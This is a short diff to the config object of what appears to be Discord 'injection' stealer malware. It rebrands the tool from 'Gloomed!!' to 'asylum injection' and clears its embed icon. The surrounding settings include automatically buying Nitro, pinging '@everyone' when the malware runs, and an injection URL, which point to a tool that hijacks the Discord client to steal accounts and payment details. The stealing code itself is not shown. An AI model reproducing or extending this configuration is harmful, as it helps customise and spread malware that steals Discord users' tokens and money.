@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Gloomed!!', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/991096084774412289/1048980793134944266/Untitled3_20221203213929.png', 
+  embed_name: 'asylum injection', 
+  embed_icon: '', 
   embed_color: 0, 
   injection_url: 'https://github.com/crxel', 
 
